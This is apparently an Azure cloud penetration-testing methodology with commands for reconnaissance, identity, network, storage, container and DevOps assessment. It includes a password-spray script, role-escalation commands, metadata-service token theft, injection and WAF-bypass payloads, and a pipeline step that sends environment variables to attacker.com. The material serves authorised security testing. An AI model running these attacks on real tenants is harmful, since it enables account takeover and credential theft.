# Azure Cloud Security Testing Methodology

## Executive Overview

This methodology provides comprehensive security testing procedures specifically designed for Microsoft Azure cloud environments. It addresses the unique security challenges of cloud infrastructure, Platform-as-a-Service (PaaS), Software-as-a-Service (SaaS), and Infrastructure-as-a-Service (IaaS) components within Azure's ecosystem.

### Cloud Security Testing Objectives
- Assess Azure identity and access management (Azure AD) security
- Evaluate cloud resource configuration and security posture
- Test network security and virtual network isolation
- Validate data protection and encryption implementation
- Assess container and serverless security
- Test cloud-specific attack vectors and lateral movement
- Evaluate monitoring, logging, and incident response capabilities

### Azure Shared Responsibility Model Alignment
This testing methodology respects the shared responsibility boundaries where Microsoft secures the underlying cloud infrastructure while customers secure their data, applications, and configurations.

## 1. Azure Environment Reconnaissance

### 1.1 Azure AD Tenant Discovery

#### Tenant Enumeration
```bash
# Discover Azure AD tenant information
curl -s "https://login.microsoftonline.com/common/.well-known/openid_configuration" | jq
curl -s "https://login.microsoftonline.com/[tenant-domain.com]/.well-known/openid_configuration"

# Azure AD tenant discovery via email
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com" | jq

# PowerShell Azure AD discovery
Get-AzureADTenantDetail
Get-AzureADDomain
```

#### Azure Services Enumeration
```bash
# Azure service discovery
nslookup target.onmicrosoft.com
nslookup target.azurewebsites.net
nslookup target.blob.core.windows.net
nslookup target.vault.azure.net

# Azure subdomain enumeration
subfinder -d target.com -source all | grep -E "(azure|microsoft)"
amass enum -d target.com | grep -E "(azure|microsoft|azurewebsites|blob\.core)"
```

### 1.2 Azure Resource Discovery

#### Storage Account Enumeration
```bash
# Storage account discovery
curl -s "https://target.blob.core.windows.net/?comp=list&include=metadata"
curl -s "https://target.file.core.windows.net/?comp=list"

# Public blob container enumeration
az storage blob list --account-name target --container-name \$web --output table
curl -s "https://target.blob.core.windows.net/\$web?restype=container&comp=list"
```

#### Azure Web Apps Discovery
```bash
# Azure Web App enumeration
curl -I https://target.azurewebsites.net
curl -s "https://target.scm.azurewebsites.net/api/settings" 

# Azure Function Apps
curl -I https://target.azurewebsites.net/api/
curl -s "https://target.azurewebsites.net/.well-known/host.json"
```

#### Azure SQL Database Discovery
```bash
# Azure SQL Server discovery
nmap -p 1433 target.database.windows.net
sqlcmd -S target.database.windows.net -d database_name -Q "SELECT @@version"

# Connection string testing
"Server=target.database.windows.net;Database=db;User ID=user;Password=pass;"
```

## 2. Azure Identity and Access Management Testing

### 2.1 Azure AD Authentication Testing

#### Password Spray Attacks
```powershell
# Azure AD password spray with PowerShell
$users = @("user1@target.com", "user2@target.com", "admin@target.com")
$passwords = @("Password123", "Summer2023", "Company123")

foreach ($password in $passwords) {
    foreach ($user in $users) {
        try {
            $credential = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $password -AsPlainText -Force))
            Connect-AzAccount -Credential $credential -ErrorAction Stop
            Write-Host "Success: $user : $password" -ForegroundColor Green
            Disconnect-AzAccount
        }
        catch {
            Write-Host "Failed: $user : $password" -ForegroundColor Red
        }
        Start-Sleep -Seconds 30  # Avoid lockout
    }
}
```

#### Token-based Authentication Testing
```python
# Azure AD token acquisition testing
import requests
import json

def test_azure_token(client_id, client_secret, tenant_id, scope):
    token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    
    data = {
        'client_id': client_id,
        'client_secret': client_secret,
        'scope': scope,
        'grant_type': 'client_credentials'
    }
    
    response = requests.post(token_url, data=data)
    if response.status_code == 200:
        return response.json()['access_token']
    else:
        return None

# Test various Azure resource scopes
scopes = [
    'https://management.azure.com/.default',
    'https://graph.microsoft.com/.default', 
    'https://vault.azure.net/.default',
    'https://storage.azure.com/.default'
]
```

### 2.2 Azure RBAC Testing

#### Privilege Enumeration
```powershell
# Current user permissions
Get-AzRoleAssignment -SignInName (Get-AzContext).Account.Id
Get-AzRoleDefinition | Where-Object {$_.IsCustom -eq $true}

# Resource-specific permissions
Get-AzRoleAssignment -ResourceGroupName "rg-production"
Get-AzRoleAssignment -ResourceName "vm-web-01" -ResourceType "Microsoft.Compute/virtualMachines"
```

#### Privilege Escalation Testing
```bash
# Azure CLI privilege testing
az role assignment list --assignee user@target.com
az role assignment create --assignee user@target.com --role "Owner" --scope /subscriptions/subscription-id

# Test for over-privileged service principals
az ad sp list --all --output table
az role assignment list --assignee service-principal-id
```

### 2.3 Conditional Access Policy Testing

#### Policy Bypass Testing
```python
# Test conditional access policy bypass
import requests
from selenium import webdriver

def test_conditional_access_bypass():
    # Test from different IP ranges
    proxies = {
        'http': 'http://proxy1:8080',
        'https': 'https://proxy1:8080'
    }
    
    # Test device compliance bypass
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    # Test location-based policies
    response = requests.post(
        'https://login.microsoftonline.com/target.com/oauth2/token',
        headers=headers,
        proxies=proxies,
        data={'username': 'user@target.com', 'password': 'password'}
    )
```

## 3. Azure Infrastructure Security Testing

### 3.1 Virtual Network Security Testing

#### Network Segmentation Assessment
```powershell
# Virtual network configuration analysis
Get-AzVirtualNetwork | Select-Object Name, AddressSpace, Subnets
Get-AzNetworkSecurityGroup | Select-Object Name, SecurityRules

# Network Security Group rule analysis
$nsg = Get-AzNetworkSecurityGroup -Name "nsg-web"
$nsg.SecurityRules | Where-Object {$_.Direction -eq "Inbound" -and $_.Access -eq "Allow"}
```

#### Network Connectivity Testing
```bash
# Test network connectivity between subnets
nmap -sS -p 1433,3389,22,80,443 10.0.1.0/24
nmap -sU -p 53,161,123 10.0.1.0/24

# Test Azure load balancer configuration
curl -I http://loadbalancer.cloudapp.azure.com
nmap -sS -p 80,443 loadbalancer.cloudapp.azure.com
```

### 3.2 Virtual Machine Security Testing

#### VM Configuration Assessment
```powershell
# VM security configuration
Get-AzVM | Select-Object Name, HardwareProfile, StorageProfile, OSProfile
Get-AzVMExtension -ResourceGroupName "rg-production" -VMName "vm-web-01"

# Disk encryption status
Get-AzVmDiskEncryptionStatus -ResourceGroupName "rg-production" -VMName "vm-web-01"
```

#### VM Access Testing
```bash
# SSH key management testing
ssh -i private_key.pem azureuser@vm-public-ip
ssh -o StrictHostKeyChecking=no azureuser@vm-public-ip

# RDP access testing
rdesktop -u administrator -p password vm-public-ip:3389
xfreerdp /u:administrator /p:password /v:vm-public-ip
```

### 3.3 Azure Container Security Testing

#### Azure Kubernetes Service (AKS) Testing
```bash
# AKS cluster reconnaissance
kubectl cluster-info
kubectl get nodes -o wide
kubectl get pods --all-namespaces

# RBAC testing in AKS
kubectl auth can-i create pods
kubectl auth can-i create clusterrolebindings
kubectl auth can-i get secrets --all-namespaces

# Container escape testing
kubectl run test-pod --image=busybox --command -- sleep 3600
kubectl exec -it test-pod -- /bin/sh

# Test privileged container access
cat > privileged-pod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: privileged-container
    image: busybox
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c", "sleep 3600"]
EOF

kubectl apply -f privileged-pod.yaml
```

#### Azure Container Registry (ACR) Testing
```bash
# ACR vulnerability assessment
az acr repository list --name myregistry
az acr repository show-tags --name myregistry --repository myapp

# Container image scanning
docker pull myregistry.azurecr.io/myapp:latest
trivy image myregistry.azurecr.io/myapp:latest
```

## 4. Azure PaaS Security Testing

### 4.1 Azure App Service Testing

#### App Service Configuration Assessment
```bash
# App Service information disclosure
curl -s "https://target.azurewebsites.net/.well-known/host.json"
curl -s "https://target.scm.azurewebsites.net/api/settings"
curl -s "https://target.scm.azurewebsites.net/api/logs/recent"

# App Service file system access
curl -s "https://target.scm.azurewebsites.net/api/vfs/site/wwwroot/"
curl -s "https://target.scm.azurewebsites.net/api/vfs/LogFiles/"
```

#### Deployment Credential Testing
```bash
# Test deployment credentials
git clone https://\$target:password@target.scm.azurewebsites.net:443/target.git

# FTP access testing
ftp target.ftp.azurewebsites.windows.net
# Username: target\\$target
# Password: deployment_password
```

### 4.2 Azure Functions Security Testing

#### Function App Reconnaissance
```bash
# Function app discovery
curl -s "https://target.azurewebsites.net/admin/host/status" 
curl -s "https://target.azurewebsites.net/admin/functions"

# Function keys enumeration
curl -s "https://target.azurewebsites.net/admin/functions/function-name/keys"
```

#### Serverless Injection Testing
```python
# Function injection testing
import requests
import json

def test_function_injection(function_url, function_key):
    # Test various injection payloads
    payloads = [
        {"name": "'; DROP TABLE users; --"},
        {"name": "<script>alert('XSS')</script>"},
        {"name": "{{7*7}}"},  # Template injection
        {"name": "${jndi:ldap://attacker.com/}"}  # Log4j style
    ]
    
    headers = {
        'Content-Type': 'application/json',
        'x-functions-key': function_key
    }
    
    for payload in payloads:
        response = requests.post(function_url, json=payload, headers=headers)
        print(f"Payload: {payload}, Status: {response.status_code}")
```

### 4.3 Azure SQL Database Testing

#### SQL Database Security Assessment
```sql
-- Azure SQL security configuration
SELECT name, is_trustworthy_on FROM sys.databases;
SELECT * FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';
SELECT * FROM sys.database_permissions;

-- Transparent Data Encryption status
SELECT db.name, db.is_encrypted, dm.encryption_state
FROM sys.databases db
LEFT OUTER JOIN sys.dm_database_encryption_keys dm
ON db.database_id = dm.database_id;
```

#### Azure SQL Authentication Testing
```bash
# SQL authentication testing
sqlcmd -S target.database.windows.net -d database -U username -P password
sqlcmd -S target.database.windows.net -d database -G  # Azure AD authentication

# Connection string injection
"Server=target.database.windows.net;Database=db;User ID=user';DROP TABLE users;--"
```

## 5. Azure Storage Security Testing

### 5.1 Blob Storage Security Testing

#### Public Access Testing
```bash
# Test anonymous blob access
curl -s "https://target.blob.core.windows.net/\$web/index.html"
curl -s "https://target.blob.core.windows.net/public/sensitive-data.pdf"

# Container enumeration
az storage blob list --account-name target --container-name public --auth-mode login
```

#### Shared Access Signature (SAS) Testing
```python
# SAS token analysis and abuse
import urllib.parse
from datetime import datetime

def analyze_sas_token(sas_url):
    parsed = urllib.parse.urlparse(sas_url)
    params = urllib.parse.parse_qs(parsed.query)
    
    print(f"Expiry: {params.get('se', ['Not set'])[0]}")
    print(f"Permissions: {params.get('sp', ['Not set'])[0]}")
    print(f"Resource: {params.get('sr', ['Not set'])[0]}")
    print(f"Protocol: {params.get('spr', ['Not set'])[0]}")

# Test SAS token permissions
def test_sas_permissions(sas_url):
    # Test read permission
    response = requests.get(sas_url)
    
    # Test write permission  
    response = requests.put(sas_url + "/test.txt", data="test content")
    
    # Test delete permission
    response = requests.delete(sas_url + "/test.txt")
```

### 5.2 Azure Key Vault Testing

#### Key Vault Access Testing
```bash
# Key Vault discovery
curl -s "https://target.vault.azure.net/secrets?api-version=7.2" \
  -H "Authorization: Bearer $ACCESS_TOKEN"

# Secret enumeration
az keyvault secret list --vault-name target-vault
az keyvault key list --vault-name target-vault
az keyvault certificate list --vault-name target-vault
```

#### Key Vault Permission Testing
```powershell
# Test Key Vault access policies
Get-AzKeyVaultAccessPolicy -VaultName "target-vault"
Set-AzKeyVaultSecret -VaultName "target-vault" -Name "test-secret" -SecretValue (ConvertTo-SecureString "test" -AsPlainText -Force)
```

## 6. Azure Network Security Testing

### 6.1 Azure Firewall Testing

#### Firewall Rule Assessment
```powershell
# Azure Firewall configuration
Get-AzFirewall | Select-Object Name, ApplicationRuleCollections, NetworkRuleCollections
Get-AzFirewallPolicy | Select-Object Name, RuleCollectionGroups
```

#### Firewall Bypass Testing
```bash
# Test firewall rules
nmap -sS -p 1-65535 target-behind-firewall.com
nmap -sU -p 53,123,161 target-behind-firewall.com

# DNS tunneling tests
dig @8.8.8.8 TXT malicious-domain.com
nslookup -type=TXT malicious-domain.com
```

### 6.2 Application Gateway Security Testing

#### Application Gateway Configuration
```bash
# Application Gateway assessment
curl -I https://gateway.cloudapp.azure.com
nmap -sS -p 80,443 gateway.cloudapp.azure.com

# WAF bypass testing
curl "https://gateway.cloudapp.azure.com/?id=1' OR '1'='1"
curl "https://gateway.cloudapp.azure.com/" -H "User-Agent: <script>alert('XSS')</script>"
```

## 7. Azure Monitoring and Logging Assessment

### 7.1 Azure Monitor Testing

#### Log Analytics Assessment
```bash
# Query Azure Monitor logs
az monitor log-analytics query \
  --workspace-id "workspace-id" \
  --analytics-query "SecurityEvent | limit 10"

# Test log retention and access
az monitor log-analytics workspace show --workspace-name "workspace-name" --resource-group "rg"
```

### 7.2 Azure Sentinel Testing

#### Sentinel Configuration Assessment
```powershell
# Sentinel workspace configuration
Get-AzSentinelWorkspace
Get-AzSentinelAlertRule -WorkspaceName "sentinel-workspace"
Get-AzSentinelDataConnector -WorkspaceName "sentinel-workspace"
```

## 8. Cloud-Specific Attack Vectors

### 8.1 Metadata Service Exploitation

#### Instance Metadata Service (IMDS) Testing
```bash
# Azure Instance Metadata Service
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Managed Identity token abuse
ACCESS_TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)

curl -H "Authorization: Bearer $ACCESS_TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### 8.2 Cross-Tenant Attacks

#### Tenant Isolation Testing
```bash
# Cross-tenant resource access
az login --tenant tenant-a-id
az account set --subscription subscription-in-tenant-b

# Guest user privilege escalation
az ad user create --display-name "Guest User" --password "TempPassword123" --user-principal-name guest@external-domain.com
az role assignment create --assignee guest@external-domain.com --role "Contributor"
```

### 8.3 Supply Chain Attacks

#### Container Image Security
```bash
# Container registry security
az acr login --name myregistry
docker pull myregistry.azurecr.io/app:latest

# Image vulnerability scanning
trivy image myregistry.azurecr.io/app:latest
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock anchore/grype myregistry.azurecr.io/app:latest
```

## 9. Azure DevOps Security Testing

### 9.1 Azure DevOps Pipeline Security

#### Pipeline Reconnaissance
```bash
# Azure DevOps API enumeration
curl -u ":personal_access_token" "https://dev.azure.com/organization/_apis/projects"
curl -u ":personal_access_token" "https://dev.azure.com/organization/project/_apis/build/definitions"

# Service connection testing
curl -u ":personal_access_token" "https://dev.azure.com/organization/project/_apis/serviceendpoint/endpoints"
```

#### Build Agent Security
```yaml
# Test pipeline injection
trigger:
- main

steps:
- script: |
    echo "Testing pipeline injection"
    curl http://attacker.com/$(whoami)
    env | curl -X POST -d @- http://attacker.com/env
  displayName: 'Malicious Script'
```

## 10. Azure Security Center Integration

### 10.1 Security Posture Assessment

#### Security Center API Testing
```bash
# Security Center assessments
az security assessment list
az security contact list
az security setting list

# Secure score analysis
az security secure-score list
az security secure-score-controls list
```

### 10.2 Defender for Cloud Testing

#### Defender recommendations
```powershell
# Defender for Cloud security alerts
Get-AzSecurityAlert
Get-AzSecurityTask
Get-AzSecurityAssessment
```

## 11. Compliance and Governance Testing

### 11.1 Azure Policy Testing

#### Policy Compliance Assessment
```bash
# Policy assignment testing
az policy assignment list
az policy state list --resource-group "rg-production"

# Test policy exemptions
az policy exemption create \
  --name "test-exemption" \
  --policy-assignment "/subscriptions/sub-id/providers/Microsoft.Authorization/policyAssignments/policy-name" \
  --exemption-category "Waiver"
```

### 11.2 Resource Tagging and Classification

#### Data Classification Assessment
```powershell
# Resource tagging analysis
Get-AzResource | Where-Object {$_.Tags.Classification -eq "Confidential"}
Get-AzStorageAccount | Where-Object {$_.Tags.DataClassification -eq ""}
```

## 12. Azure-Specific Testing Tools

### 12.1 Cloud Security Tools

#### Azure Security Assessment Tools
```bash
# ScoutSuite for Azure
scout azure --cli-creds --report-dir ./scout_report

# Prowler for Azure
prowler azure --compliance-azure-cis-1.5

# PowerShell Azure AD assessment
Install-Module AzureADAssessment
Invoke-AzureADAssessment
```

#### Custom PowerShell Scripts
```powershell
# Azure security assessment script
function Test-AzureSecurityConfiguration {
    # Storage account security
    $storageAccounts = Get-AzStorageAccount
    foreach ($sa in $storageAccounts) {
        $keys = Get-AzStorageAccountKey -ResourceGroupName $sa.ResourceGroupName -Name $sa.StorageAccountName
        if ($sa.EnableHttpsTrafficOnly -eq $false) {
            Write-Warning "Storage account $($sa.StorageAccountName) allows HTTP traffic"
        }
    }
    
    # Virtual machine security
    $vms = Get-AzVM
    foreach ($vm in $vms) {
        $vmStatus = Get-AzVmDiskEncryptionStatus -ResourceGroupName $vm.ResourceGroupName -VMName $vm.Name
        if ($vmStatus.OsVolumeEncrypted -eq "NotEncrypted") {
            Write-Warning "VM $($vm.Name) OS disk is not encrypted"
        }
    }
}
```

## 13. Incident Response Testing

### 13.1 Security Alert Validation

#### Alert Testing Procedures
```bash
# Generate test security events
# Suspicious login attempts
curl -X POST "https://login.microsoftonline.com/tenant.onmicrosoft.com/oauth2/token" \
  -d "grant_type=password&username=admin@tenant.com&password=wrongpassword"

# Mass data download simulation
az storage blob download-batch --destination ./downloads --source \$web --account-name target
```

### 13.2 Forensics and Evidence Collection

#### Azure Forensics Tools
```bash
# Azure activity log analysis
az monitor activity-log list --start-time 2023-01-01T00:00:00Z
az monitor activity-log list --caller admin@target.com

# Storage account audit log analysis
az storage logging show --account-name target
az storage metrics show --account-name target
```

## Testing Deliverables and Reporting

### Cloud Security Assessment Report Structure

```markdown
## Azure Cloud Security Assessment Report

### Executive Summary
- **Cloud Maturity Assessment**: [Basic/Intermediate/Advanced]
- **Security Posture Score**: [Score/100]
- **Critical Findings**: [Number of critical issues]
- **Compliance Status**: [Compliant/Non-compliant with relevant frameworks]

### Azure Service Security Analysis
| Service | Security Level | Critical Issues | Recommendations |
|---------|----------------|-----------------|-----------------|
| Azure AD | High/Medium/Low | X | [Priority actions] |
| Storage Accounts | High/Medium/Low | X | [Priority actions] |
| Virtual Machines | High/Medium/Low | X | [Priority actions] |
| App Services | High/Medium/Low | X | [Priority actions] |

### Identity and Access Management
- **Azure AD Configuration**: [Assessment results]
- **RBAC Implementation**: [Assessment results] 
- **Conditional Access**: [Assessment results]
- **Privileged Identity Management**: [Assessment results]

### Infrastructure Security
- **Network Security**: [Assessment results]
- **Compute Security**: [Assessment results]
- **Storage Security**: [Assessment results]
- **Database Security**: [Assessment results]

### Monitoring and Compliance
- **Logging Configuration**: [Assessment results]
- **Security Center Status**: [Assessment results]
- **Policy Compliance**: [Assessment results]
- **Threat Detection**: [Assessment results]
```

### Azure Security Testing Checklist

#### Pre-Assessment
- [ ] Azure subscription access confirmed
- [ ] Testing scope and boundaries defined
- [ ] Shared responsibility model reviewed
- [ ] Azure support case opened (if required)
- [ ] Backup and recovery procedures documented

#### Identity and Access Management
- [ ] Azure AD tenant security assessed
- [ ] User authentication mechanisms tested
- [ ] Role-based access control validated
- [ ] Conditional access policies evaluated
- [ ] Privileged access management reviewed

#### Infrastructure Security  
- [ ] Virtual network security assessed
- [ ] Network security groups evaluated
- [ ] Virtual machine security validated
- [ ] Storage account security tested
- [ ] Database security configuration reviewed

#### Platform Services Security
- [ ] App Service security assessed
- [ ] Function App security validated
- [ ] Container security evaluated
- [ ] API management security tested
- [ ] Service bus security reviewed

#### Monitoring and Compliance
- [ ] Azure Monitor configuration assessed
- [ ] Security Center recommendations reviewed
- [ ] Policy compliance validated
- [ ] Audit logging configuration tested
- [ ] Incident response procedures evaluated

---

**Document Version**: 2.0
**Classification**: Confidential  
**Last Updated**: [Current Date]
**Next Review**: [Review Date]
**Approved By**: [Cloud Security Team Lead]